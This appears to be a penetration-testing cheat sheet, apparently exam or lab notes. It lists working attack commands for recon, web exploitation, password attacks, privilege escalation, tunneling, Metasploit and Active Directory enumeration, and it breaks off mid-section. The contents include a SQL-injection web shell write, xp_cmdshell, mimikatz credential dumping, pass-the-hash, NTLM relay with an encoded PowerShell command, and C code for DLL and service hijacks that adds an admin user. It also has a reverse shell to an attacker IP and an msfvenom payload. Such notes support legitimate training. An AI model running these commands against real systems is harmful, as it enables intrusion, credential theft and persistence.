# Information Gathering

## Passive Information Gathering

### Whois

- Run a WHOIS lookup. The `-h` flag specifies the WHOIS server to query.

```bash
whois megacorpone.com -h 192.168.50.251
```

## Active Information Gathering

### Finalrecon

- Gather information about a website or domain.

```bash
finalrecon --url https://academy.hackthebox.com/ --full
```

### Nmap

- Host discovery

```bash
nmap -sn 192.168.50.1-253
```

- Scan the top 20 TCP ports

```bash
nmap -sT -A --top-ports=20 192.168.50.1-253 -oG top-port-sweep.txt
```

- UDP scan

```bash
sudo nmap -sU 192.168.50.149
```

### fping

- Sweep for live hosts

```bash
fping -asgq 172.16.8.0/23 > alive_hosts.txt
```

### FTP (21)

- Enumeration — Nmap's `-sC` option includes the `ftp-anon` check.

```bash
sudo nmap -sC -sV -p 21 192.168.2.142
```

- Brute-forcing

```bash
hydra -l admin -P /path/to/passwords.txt ftp://192.168.1.100
```

- Anonymous login

```console
┌──(kali㉿kali)-[~/Desktop]
└─$ ftp 172.31.213.250           
Connected to 172.31.213.250.
220 (vsFTPd 3.0.3)
Name (172.31.213.250:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
```

### DNS Enumeration (53)

- Enumeration (DNSRecon)

```bash
dnsrecon -d megacorpone.com -t std
```

- Enumeration (DNSEnum)

```bash
dnsenum megacorpone.com
```

- Subdomain brute-forcing (gobuster)

```bash
gobuster dns --domain inlanefreight.com -w /usr/share/wordlists/subdomains.txt
```

- NS, ANY queries (ns, any)

```bash
dig ns <domain.tld> @<nameserver>
dig ns <domain.tld> @<nameserver>
```

- AXFR request (axfr)
  - Request a full zone transfer from the primary DNS server

```bash
dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
```

### SMB (139,445)

- Enumeration (nbtscan)

```bash
sudo nbtscan -r 192.168.50.0/24
```

- Enumeration (enum4linux)

```bash
enum4linux -a 172.31.135.192
```

- Windows environment

```cmd
net view \\dc01 /all
```

- List shares (null session)

```bash
smbclient -N -L //172.31.135.19
```

- Connect to a share

```bash
smbclient //172.31.135.192/samba-share -U "<username>"
```

- Brute-forcing

```bash
netexec smb 10.129.42.198 -u bob -p password.txt
hydra -l bob -P password.txt smb://10.129.42.198
```

- Dump the entire directory tree

```console
smbclient //server/share -U username
smb: \> prompt off
smb: \> recurse on
smb: \> mget *
```

### SMTP Enumeration (25)

- Check for existing users (VRFY, EXPN)

```console
nc -nv 192.168.50.8 25
VRFY root
```

- smtp-user-enum
  - Supports VRFY, EXPN and RCPT

```bash
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```

### IMAP (143,993) / POP3 (110,995)

- Interact with imap/pop3 (telnet)

```bash
telnet 10.129.14.128 110
telnet 10.129.14.128 143
openssl s_client -connect 10.129.14.128:imaps
openssl s_client -connect 10.129.14.128:pop3s
```

- IMAP command reference
  - Note: the leading `1` is a tag, used to match each request with its response.

| Command | Description |
| --- | --- |
| `1 LOGIN username password` | Log in as a user |
| `1 LIST "" *` | List all directories (mailboxes) |
| `1 CREATE "INBOX"` | Create a mailbox with the given name |
| `1 DELETE "INBOX"` | Delete a mailbox |
| `1 RENAME "ToRead" "Important"` | Rename a mailbox |
| `1 LSUB "" *` | List the mailboxes the user is subscribed to |
| `1 SELECT INBOX` | Select a mailbox so its messages can be accessed |
| `1 UNSELECT INBOX` | Leave the selected mailbox |
| `1 FETCH all` | Fetch data for specific messages in the mailbox |
| `1 CLOSE` | Remove every message flagged as Deleted |
| `1 LOGOUT` | Close the connection to the IMAP server |
| `1 FETCH 1 BODY[]` | Retrieve the full message |
| `1 FETCH 1 BODY[HEADER]` | Retrieve the message headers |
| `1 FETCH 1 BODY[TEXT]` | Retrieve the message body |

- POP3 command reference

| Command | Description |
| --- | --- |
| `USER` | Enter the username |
| `PASS` | Enter the password |
| `LIST` | List all messages |
| `RETR` | Retrieve the message contents |

### NFS (111, 2049)

- List shared folders (showmount)

```bash
showmount -e 172.31.135.192
```

- Mount a share

```bash
sudo mkdir /mnt/test
sudo mount -t nfs 172.31.135.192:/public-nfs /mnt/test -o nolock
```

- Unmount

```bash
sudo umount ./target-NFS
```

### SNMP Enumeration (UDP 161)

- Brute-force community strings

```bash
onesixtyone -c community.txt 10.129.14.128
```

- snmpwalk

```bash
snmpwalk -v2c -c public 10.129.189.221 -t 10
```

- snmpbulkwalk

```bash
snmpbulkwalk -v2c -c public 10.129.230.96
```

- Check nsExtendObjects

```bash
sudo apt install snmp-mibs-downloader
snmpwalk -v2c -c public 192.168.102.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
```

# Web Application Attacks

## Web Application Assessment Tools

- nmap http-enum script

```bash
sudo nmap -p80 --script=http-enum 192.168.50.20
```

- Wappalyzer
  - Identifies the technology stack a website is built on

```text
https://chromewebstore.google.com/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg?pli=1
```

- eyewitness
  - Takes a screenshot of every site in the list

```bash
eyewitness -f subdomain.txt
```

## Web Fuzzing Tools

### gobuster

- gobuster

```bash
gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5
```

- gobuster API enumeration

```bash
gobuster dir -u http://192.168.50.16 -w /usr/share/wordlists/dirb/big.txt -p pattern.txt
```

### feroxbuster

- feroxbuster

```bash
feroxbuster -u http://example.com -s 200
```

- Send a POST body with curl

```bash
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
```

### ffuf

- ffuf GET

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt \
-u http://SERVER_IP:PORT/FUZZ
```

- ffuf POST

```bash
ffuf -w words.txt -u http://SERVER_IP:PORT/login -X POST -d 'username=admin&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded'
```

- ffuf recursive fuzzing

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php
```

- ffuf subdomain

```bash
ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.academy.htb/
```

- ffuf vhost
  - When fuzzing with a header, the response size is usually what you judge by
  - The `fs` option filters by size

```bash
ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs 900
```

### Medusa

- Targeting a service
  - The `-d` option lists the supported modules

```bash
medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh
```

- Targeting multiple web servers with basic HTTP authentication

```bash
medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET
```

- Testing for empty or default passwords
  - `-e n`: try with no password
  - `-e s`: try the username as the password

```bash
medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name
```

## SQL Injection

### mysql

- Connect to mysql

```bash
mysql -u root -p'root' -h 192.168.50.16 -P 3306 --skip-ssl-verify-server-cert
```

### mssql

- Connect to mssql

```bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
```

### mysql command execute

- Check file access privileges
  - If the variable is empty, the setting is unsafe
  - If it is set to a directory name, file operations are restricted to files in that directory
  - If it is set to NULL, the feature is disabled

```sql
show variables like "secure_file_priv";
```

- Write a file to the web server with select into outfile

```sql
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

### mssql command execute

- Enable xp_cmdshell

```sql
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

- Execute a shell command

```sql
EXECUTE xp_cmdshell 'whoami';
```

### mysql read local files

- Read a local file

```sql
select LOAD_FILE("/etc/passwd");
```

### mssql read local files

- Read a local file

```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```

### sqlmap

- The `-u` option sets the URL to scan; `-p` selects the parameter

```bash
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
```

- POST request

```bash
sqlmap -u "http://127.0.0.1/login" --data="username=test&password=test"
```

- Use an HTTP request file

```console
KalioNix@htb[/htb]$ cat req.txt
HTTP / HTTP/1.0
Host: www.example.com
 
{
  "data": [{
    "type": "articles",
    "id": "1",
    "attributes": {
      "title": "Example JSON",
      "body": "Just an example",
      "created": "2020-05-22T14:56:29.000Z",
      "updated": "2020-05-22T14:56:28.000Z"
    },
    "relationships": {
      "author": {
        "data": {"id": "42", "type": "user"}
      }
    }
  }]
}
 
KalioNix@htb[/htb]$ sqlmap -r req.txt
```

- Dump data
  - `--dbs` → `--tables` → `--columns` → `--dump`

```bash
# 1. List databases
sqlmap -u "http://127.0.0.1/vuln.php?id=1" --dbs
 
# 2. List tables in a database
sqlmap -u "http://127.0.0.1/vuln.php?id=1" -D testdb --tables
 
# 3. List columns in a table
sqlmap -u "http://127.0.0.1/vuln.php?id=1" -D testdb -T users --columns
 
# 4. Dump a table
sqlmap -u "http://127.0.0.1/vuln.php?id=1" -D testdb -T users --dump
 
# 5. Dump specific columns
sqlmap -u "http://127.0.0.1/vuln.php?id=1" -D testdb -T users -C "id,username" --dump
```

- command execute
  - `-r` points at a file containing the POST request; `--os-shell` gives command execution

```bash
sqlmap -r post.txt -p item  --os-shell --web-root "/var/www/html/tmp"
```

## wordpress

### wpscan

- Enumerate everything wpscan can find on the WordPress install

```bash
wpscan --url http://blog.inlanefreight.local --enumerate
```

- Enumerate WordPress plugins

```bash
wpscan --url http://blog.inlanefreight.local -e ap --plugins-detection mixed
```

- Enumerate vulnerable plugins

```bash
wpscan --url http://blog.inlanefreight.local -e vp --plugins-detection mixed
```

- Login brute-force

```bash
wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

# Fixing Exploits

## Cross-Compiling Exploit Code

### mingw-w64 cross-compiler

- Install

```bash
sudo apt install mingw-w64
```

- Compile a Windows executable (PE) from Linux

```bash
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
```

# Antivirus Evasion

## Shellter

- Install

```bash
apt-cache search shellter
sudo apt install shellter
sudo apt install wine
```

# Password Attacks

## Password Directory

### kerbrute

- Build a username list

```bash
./kerbrute userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt
```

### Network Services Login Attacks

- ssh

```bash
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
```

- rdp

```bash
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
```

- http post

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

## Password Cracking

### hashcat

- hashcat
  - Rule location: `ls -la /usr/share/hashcat/rules/`

```bash
hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force
```

### file password crack using john

- Extract hashes from a file

```console
KalioNix@htb[/htb]$ locate *2john*
 
/usr/bin/bitlocker2john
/usr/bin/dmg2john
/usr/bin/gpg2john
/usr/bin/hccap2john
```

```bash
ssh2john.py SSH.private > ssh.hash
john --wordlist=rockyou.txt ssh.hash
```

### linux credentials crack

- Convert the passwd and shadow files into a form suitable for cracking

```bash
sudo cp /etc/passwd /tmp/passwd.bak
sudo cp /etc/shadow /tmp/shadow.bak
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```

- Crack with hashcat

```bash
ashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

## Password Manager

### cmdkey

- Enumerate credentials stored in the current user's profile

```cmd
cmdkey /list
```

- Run a command with an Interactive-type credential

```cmd
runas /savecred /user:SRV01\mcharles cmd
```

### KeePass

- Search for .kdbx files (KeePass database files)

```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

- Extract the hash from the database file

```bash
keepass2john Database.kdbx > keepass.hash
```

- Crack the KeePass hash

```bash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

### SSH Private Key Passphrase

- Extract the hash from an ssh private key

```bash
ssh2john id_rsa > ssh.hash
```

- Crack the ssh private key hash (hashcat)

```bash
hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
```

- Crack the ssh private key hash (john)

```bash
sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'
john --wordlist=ssh.passwords --rules=sshRules ssh.hash
```

## Working with Password Hashes

### Windows SAM, SYSTEM, SECURITY cracking

- Dump the sam, system and security registry hives

```cmd
reg.exe save hklm\sam sam
reg.exe save hklm\system system
reg.exe save hklm\security security
```

- Dump hashes with secretsdump

```bash
impacket-secretsdump -sam SAM -system SYSTEM local -system system LOCAL
```

### Cracking NTLM

- List system local users

```powershell
PS C:\Users\offsec> Get-LocalUser
```

- Run mimikatz

```console
PS C:\tools> .\mimikatz.exe
privilege::debug
```

- Enable SeDebugPrivilege

```text
token::elevate
```

- Dump NTLM hashes

```text
lsadump::sam
```

- Crack the hash

```bash
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### Pass The Hash

- SMB access

```bash
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
```

- Shell execution (impacket-psexec)

```bash
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```

- Shell execution (impacket-wmiexec)

```bash
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```

- Allow RDP PtH

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

- Connect over RDP with PtH

```bash
xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```

### Net-NTLMv2

- responder (credential collection tool)
  - NTLMv2 hashes (from SMB authentication attempts), Kerberos tickets
  - Collects credentials when a user mistypes a UNC share path on the network

```bash
sudo responder -I tap0
```

- Crack the hash

```bash
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
```

- Net-NTLMv2 relay
  - `--no-http-server`: do not start an HTTP server, relay SMB only
  - `smb2support`: enable SMB2/SMB3 (required, modern Windows uses SMB2 or later)
  - `-t 192.168.50.212`: the target
  - `-c "powershell -enc ..."`: the command to run after a successful authentication

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
```

### Windows credential protection

- Dump every credential mimikatz can reach

```console
PS C:\tools\mimikatz> .\mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

- Pass The Hash

```bash
impacket-wmiexec -debug -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.50.248
```

- Bypass with SSP (Security Support Provider) injection
  - Instead of dumping an already stored hash, capture the plaintext password the moment a user logs in

```text
# SSP Injection
mimikatz # privilege::debug
mimikatz # misc::memssp
 
# Check the log
type C:\Windows\System32\mimilsa.log
```

# Windows Privilege Escalation

## Enumerating Windows

### Situational Awareness

- Username / groups

```cmd
whoami
whoami /groups
```

- User privileges

```cmd
whoami /priv
```

- Other users and groups on the system

```console
# CMD
C:\Users\dave> net user
C:\Users\dave> net localgroup
# PowerShell
PS C:\Users\dave> Get-LocalUser
PS C:\Users\dave> Get-LocalGroup
```

- Check group members

```powershell
Get-LocalGroupMember adminteam
```

- Operating system information

```cmd
systeminfo
```

- Routing table

```cmd
route print
```

- Active network connections

```cmd
netstat -ano
```

- List installed applications

```cmd
wmic product get name
```

- Running processes

```powershell
Get-Process
```

- Running services

```powershell
get-service | ? {$_.DisplayName -like 'Druva*'}
```

### Hidden in Plain View

- CMD - findstr

```cmd
findstr /SIM "passw" C:\*.* 2>nul
```

- PowerShell - Get-ChildItem

```powershell
Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
```

- PowerShell - Select-String

```powershell
Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
```

- Search for password manager databases

```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

- Search for sensitive information

```powershell
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```

- Search for text files

```powershell
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

- Run cmd as a specific user

```cmd
runas /user:backupadmin cmd
```

### Information Goldmine PowerShell

- Print the history file path

```powershell
(Get-PSReadlineOption).HistorySavePath
```

- PowerShell history

```cmd
type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

- Shell connection

```bash
evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
```

### Automated Enumeration

- winpeas

```powershell
REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
.\winPEAS.exe
```

- PowerUp

```powershell
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned
 
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

- SharpUp

```powershell
.\SharpUp.exe audit
```

### Log

- Check event logs

```powershell
Get-WinEvent -MaxEvents 30 | findstr backup
```

- Check Task Scheduler logs

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TaskScheduler/Operational" -MaxEvents 30 | findstr backup
```

## Automated Escalation

### PrintSpoofer

Works when SeImpersonatePrivilege is held and the Print Spooler service (spoolsv.exe) is running

- Execute a command

```cmd
.\PrintSpoofer.exe -i -c cmd.exe
.\PrintSpoofer64.exe -c "sh.exe"
```

### SigmaPotato

SeImpersonatePrivilege plus several techniques combined

- Execute a command

```cmd
.\SigmaPotato "net user hacked 1q2w3e4r /add"
.\sigmaPotato "net localgroup Administrators hacked /add"
```

- Reverse shell

```cmd
.\SigmaPotato.exe --revshell 192.168.45.155 4444
```

## Abusing Windows Services

### Service binary hijacking

- List services with their binary paths

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

- Print binary permissions

```cmd
icacls "C:\xampp\apache\bin\httpd.exe"
```

- adduser.c code

```c
#include <stdlib.h>
 
int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

- Cross-compile

```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

- Check the service start type

```powershell
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
```

- Reboot

```cmd
shutdown /r /t 0
```

### DLL hijacking

- useradd C++ DLL code

```c
#include <stdlib.h>
#include <windows.h>
 
BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave3 password123! /add");
  	    i = system ("net localgroup administrators dave3 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

- Cross-compile as a DLL

```bash
x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
```

### Unquoted Service Paths

- Check directory permissions

```cmd
icacls "C:\"
```

- Example unquoted service path search order

```text
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```

### Abusing other Windows components

- Check scheduled tasks

```cmd
schtasks /query /fo LIST /v
```

- Use an exploit

```console
# System information
systeminfo
# Security patch information
Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
```

# Linux Privilege Escalation

## Linux Enumeration

### Manual enumeration

- User information

```bash
hostname
id
```

- Enumerate all users

```bash
cat /etc/passwd
```

- OS release and version information

```bash
cat /etc/issue
cat /etc/os-release
uname -a
```

- Environment variables

```bash
env
```

- .bashrc

```bash
cat .bashrc
```

- sudo privileges

```bash
sudo -l
```

- Process information

```bash
ps aux
```

- Routing information

```bash
route
routel
```

- Network connections and listening ports

```bash
ss -anp
netstat -nltpa
```

- iptables firewall policy

```bash
cat /etc/iptables/rules.v4
```

- Scheduled tasks

```bash
ls -lah /etc/cron*
crontab -l
```

- Installed applications (dpkg)

```bash
dpkg -l
```

- Find directories the current user can write to

```bash
find / -writable -type d 2>/dev/null
```

- Drives mounted at boot

```bash
cat /etc/fstab
```

- Find SUID binaries

```bash
find / -perm -u=s -type f 2>/dev/null
```

### Automated enumeration

- unix-privesc-check

```bash
unix-privesc-check standard > output.txt
```

- linpeas

```bash
./linpeas > output.txt
```

- linux-exploit-suggester
  - [https://github.com/The-Z-Labs/linux-exploit-suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)

```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
./les.sh
```

- pspy64s
  - Monitors every process on the system in real time without root
  - [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)

```bash
./pspy64s
```

## Exposed Secrets

### Inspecting Service Footprints

- Run ps every second

```bash
watch -n 1 "ps -aux | grep pass"
```

- Filter traffic

```bash
sudo tcpdump -i lo -A | grep "pass"
```

- cron log

```bash
grep "CRON" /var/log/syslog
```

- gtfobins

```text
https://gtfobins.github.io/
```

# Port Redirection and SSH Tunneling

## Port Forwarding with Linux Tools

### ligolo-ng

- Start the proxy on Kali

```bash
sudo ligolo-proxy -selfcert
```

- Connect from the pivot host

```bash
./agent -connect 192.168.45.246:11601 -ignore-cert
```

- Enable tunneling on Kali

```console
session
interface_create --name ligolo
start --tun ligolo
route_add --name ligolo --route 172.16.247.0/24
```

- listener_add

```bash
listener_add --addr 10.10.10.5:30000 --to 127.0.0.1:10000 --tcp
```

### Socat port forwarding

- Port forwarding with socat

```bash
socat TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
```

### SSH tunneling

- Local port forwarding

```bash
ssh -f -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
```

- Dynamic port forwarding

```console
# Dynamic port forwarding
ssh -f -N -D 9050 database_admin@10.4.50.215
# Edit the proxychains4 config file
tail /etc/proxychains4.conf
socks4 127.0.0.1 9050
# proxychains
proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
```

- Remote port forwarding

```bash
ssh -f -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```

- Remote dynamic port forwarding

```console
# Remote dynamic port forwarding
ssh -f -N -R 9998 kali@192.168.118.4
# Edit the proxychains4 config file
tail /etc/proxychains4.conf
# proxychains
proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
```

### Using sshuttle

- Set up port forwarding on the remote server

```bash
socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
```

- Route all traffic to (10.4.50.0/24, 172.16.50.0/24) through the SSH tunnel

```bash
sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
```

## Port Forwarding with Windows Tools

### Plink

- Location of plink.exe on Kali Linux

```console
kali@kali:~$ find / -name plink.exe 2>/dev/null
/usr/share/windows-resources/binaries/plink.exe
```

- Set up remote port forwarding

```cmd
C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
```

### Netsh

- Add a port forwarding rule

```cmd
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
```

- Add a firewall allow rule

```cmd
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
```

- Delete the firewall rule

```cmd
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
```

- Delete the port forwarding rule

```cmd
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
```

## HTTP Tunneling

### HTTP tunneling with Chisel

- Start the chisel server

```bash
chisel server -p 8000 --reverse
```

- chisel client

```console
# Reverse port forwarding
chisel client SERVER_IP:8000 R:8080:localhost:80
# SOCKS proxy
chisel client SERVER_IP:8000 R:9990:socks
```

- Use the chisel tunnel through proxychains

```console
# /etc/proxychains4.conf
socks5 127.0.0.1 9990
# Connect on port 1080
proxychains ssh database_admin@10.4.50.215
```

# Metasploit Framework

## MSF

### Basic commands

- Create and initialise the msf database

```bash
sudo msfdb init
```

- Start the Metasploit Framework

```bash
sudo msfconsole
```

- Create a workspace

```text
workspace -a pen200
```

- Run nmap from inside Metasploit

```text
db_nmap -A 192.168.50.202
```

- Print the collected information

```text
hosts
services
```

- List auxiliary modules

```text
db_nmap -A 192.168.50.202
```

- Search SMB auxiliary modules

```text
search type:auxiliary smb
```

### Exploit modules

- Set the payload

```text
set payload linux/x64/shell_reverse_tcp
```

- List sessions

```text
sessions -l
```

- Attach to a session

```text
sessions -i 2
```

## Using Payloads

### Staged / non-staged payloads

- List payloads

```text
show payloads
```

- Spawn a shell

```text
shell
```

- Interact with a channel

```text
channel -l
channel -i 1
```

- Download / upload files

```text
download /etc/passwd
upload /usr/bin/unix-privesc-check /tmp/
```

### Executable payloads

- List available payloads

```bash
msfvenom -l payloads --platform windows --arch x64
```

- Generate a Windows reverse shell binary

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o nonstaged.exe
```

- Set up a listener in Metasploit

```text
use multi/handler
set payload windows/x64/shell/reverse_tcp
show options
set LHOST 192.168.119.2
set LPORT 443
run
```

## Post-Exploitation with Metasploit

### Core features

- Spawn a shell and check privileges

```console
shell
whoami /priv
exit
```

- Escalate with getsystem
  - Uses SeImpersonatePrivilege and SeDebugPrivilege

```text
getuid
getsystem
getuid
```

- migrate

```text
ps
migrate 8052
```

### Post-exploitation modules

- Search for UAC bypass modules

```text
search UAC
```

- Check the integrity level

```console
shell
powershell -ep bypass
Import-Module NtObjectManager
Get-NtTokenIntegrityLevel
```

- Run a bypass module

```text
use exploit/windows/local/bypassuac_sdclt
show options
set SESSION 9
set LHOST 192.168.119.4
run
```

- Use the kiwi module (steal LM/NTLM credentials)

```text
load kiwi
help
creds_msv
```

### Pivoting with Metasploit

- Route through session 12

```text
route add 172.16.5.0/24 12
```

- Port scan

```text
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.5.200
set PORTS 445,3389
run
```

- Automatic routing

```text
use multi/manage/autoroute
show options
sessions -l
set session 12
run
```

- Set up a SOCKS proxy

```console
# metasploit
use auxiliary/server/socks_proxy
show options
set SRVHOST 127.0.0.1
set VERSION 5
run -j
 
# /etc/proxychains4.conf
tail /etc/proxychains4.conf
 
# use proxychains
sudo proxychains xfreerdp /v:172.16.5.200 /u:luiza
```

- Port forwarding

```text
portfwd add -l 3389 -p 3389 -r 172.16.5.200ㅠ
```

# Active Directory Enumeration

## Manual Enumeration

### Enumeration with legacy Windows tools

- Print domain users

```cmd
net user /domain
```

- Print information about a specific domain user

```cmd
net user jeffadmin /domain
```

- Print domain groups

```cmd
net group /domain
```

- Enumerate the members of a specific group

```cmd
net group "Sales Department" /domain
```

### Enumeration with PowerShell and .NET classes

- Print detailed information about the Active Directory domain

```powershell
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

- Find the LDAP path

```powershell
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"
$LDAP
```

```console
PS C:\Users\stephanie> powershell -ep bypass
PS C:\Users\stephanie> .\enumeration.ps1
LDAP://DC1.corp.com/DC=corp,DC=com
```

### Enumeration with PowerView

- Import PowerView into memory

```powershell
Import-Module .\PowerView.ps1
```

- Enumerate domain information

```powershell
Get-NetDomain
```

- Enumerate every user in the domain

```powershell
Get-NetUser
```

- Query users with select

```powershell
Get-NetUser | select cn
```

- Query showing pwdlastset and lastlogon

```powershell
Get-NetUser | select cn,pwdlastset,lastlogon
```

- Enumerate groups

```powershell
Get-NetGroup | select cn
```

- Enumerate a specific group

```powershell
Get-NetGroup "Sales Department" | select member
```

- Enumerate computer objects

```powershell
Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname
```

### User enumeration

- Enumerate users with CrackMapExec's --users option

```bash
nxc smb 172.16.5.5 --users
```

- Extract a user list with Kerbrute

```bash
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

### Privileges and logged-on users

- Use PowerView to find computers where the current user has admin rights

```powershell
Find-LocalAdminAccess
```

- Use PowerView to find users logged on to a machine

```powershell
Get-NetSession -ComputerName files04 -Verbose
```

- Use PsLoggedOn to check who is logged on to a specific machine

```powershell
.\PsLoggedon.exe \\files04
```

- RDP to a specific machine

```cmd
mstsc /v:client74
```

### Enumeration via Service Principal Names

- List the SPNs tied to a specific user account

```cmd
setspn -L iis_service
```

- List SPN accounts in the domain with PowerView

```powershell
